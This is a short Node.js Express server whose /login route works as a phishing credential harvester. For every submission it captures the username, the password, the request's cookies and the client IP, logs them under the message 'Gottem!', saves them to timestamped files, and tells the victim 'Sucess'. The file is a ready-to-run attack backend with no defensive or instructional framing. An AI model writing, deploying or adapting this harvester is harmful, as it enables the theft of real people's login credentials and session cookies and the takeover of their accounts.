const express = require("express");
const app = express();
const PORT = 3000;
const fs = require("fs");

app.use(express.static("public"));
app.use(express.urlencoded({ extended: true }));

app.post("/login", (req, res) => {
    const data = {
        username: req.body.usernameinput,
        password: req.body.passwordinput,
        cookie: req.headers.cookie,
        ip: req.socket.remoteAddress
    };

    console.log("Gottem! " + JSON.stringify(data));


    fs.writeFile(__dirname + "/requests/" + Date.now() + ".req", JSON.stringify(data), (err) => {
        if (err) {
            console.error(err);
        }
    })

    res.send("Sucess");
})

app.listen(PORT, console.log(`Server listening on port ${PORT}`));